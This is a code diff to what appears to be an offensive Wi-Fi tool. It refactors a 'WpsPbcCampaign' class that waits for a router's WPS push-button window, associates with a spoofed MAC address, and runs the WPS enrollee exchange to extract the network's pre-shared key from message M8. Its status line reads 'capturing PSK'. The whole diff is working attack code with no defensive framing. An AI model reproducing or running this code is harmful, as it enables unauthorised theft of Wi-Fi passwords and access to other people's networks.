@@ -1,4 +1,4 @@
-"""WpsPbcCapture: live orchestrator for opportunistic WPS Push-Button capture.
+"""WpsPbcCampaign: live orchestrator for opportunistic WPS Push-Button capture.
 
 Given an AP in (or entering) its PBC walk window, associate as an Enrollee and
 run the WpsEnrollee exchange to extract the PSK from M8. This is the active piece
@@ -8,6 +8,7 @@ the Scanner/Focus arming wires to; detection itself is passive
 
 from __future__ import annotations
 
+import asyncio
 import logging
 from typing import Optional
 
@@ -22,24 +23,25 @@ from .wps.registrar import AttemptOutcome, PinResult
 
 logger = logging.getLogger(__name__)
 
-
-class PbcWatcher:
-    """Edge-detects PBC walk windows opening across the live AP list."""
-
-    def __init__(self):
-        self._active: set = set()
-
-    def new_windows(self, aps):
-        current = {ap.bssid for ap in aps if getattr(ap, "wps_pbc_active", False)}
-        opened = current - self._active
-        self._active = current
-        return [ap for ap in aps if ap.bssid in opened]
+SETTLE_S = 1.0  # On the AP's channel before Auth: some routers advertise PBC before they're actually ready
 
 
-class WpsPbcCapture(Campaign):
+class WpsPbcCampaign(Campaign):
     button_id = None   # no button, auto-triggered when a PBC window opens
     key = "pbc"
     stoppable = False
+
+    @classmethod
+    def ineligible_reason(cls, ap) -> Optional[str]:
+        if ap.is_hidden:
+            return "hidden SSID: can't associate"
+        return None
+
+    def status_under_card(self) -> str:
+        return "● WPS PBC"
+
+    def status_headlines(self, vault) -> list[str]:
+        return ["[bold green]● WPS PushButton[/bold green] window: capturing PSK"]
 
     def __init__(self, array, target, our_mac: Optional[bytes] = None, log=None,
                  tx_observer=None):
@@ -70,12 +72,14 @@ class WpsPbcCapture(Campaign):
         # clears all three (and restores the channel) on exit.
         lease = self.array.lease(channel=self.channel, fake_mac=self.our_mac,
                                  bssid=str_to_mac(self.bssid), ack_tally=True, iface=self.iface)
+        wsc_2_0 = self.target.wps_version == "2.0"
         async with lease as iface:
+            await asyncio.sleep(SETTLE_S)
             if lease.mac:
                 self.our_mac = str_to_mac(lease.mac)
             assoc = Association(iface, self.bssid, self.target.ssid or "",
                                 self.channel, our_mac=self.our_mac,
-                                assoc_trailer_ies=wps_assoc_ie(WPS_REQ_ENROLLEE),
+                                assoc_trailer_ies=wps_assoc_ie(WPS_REQ_ENROLLEE, wsc_2_0),
                                 should_stop=lambda: self.stopped)
             assoc.start()
             warning = iface.active_monitor_warning()
@@ -93,7 +97,8 @@ class WpsPbcCapture(Campaign):
                     if not await assoc.associate():
                         self.log(f"assoc failed ({assoc.fail_reason}); running EAPOL anyway")
                     outcome = await WpsEnrollee(transport, str_to_mac(self.bssid),
-                                                self.our_mac, log=self.log,
+                                                self.our_mac, channel=self.channel,
+                                                wsc_2_0=wsc_2_0, log=self.log,
                                                 should_stop=lambda: self.stopped,
                                                 msg_timeout=8.0, eapol_start_timeout=6.0,
                                                 overall_timeout=40.0,
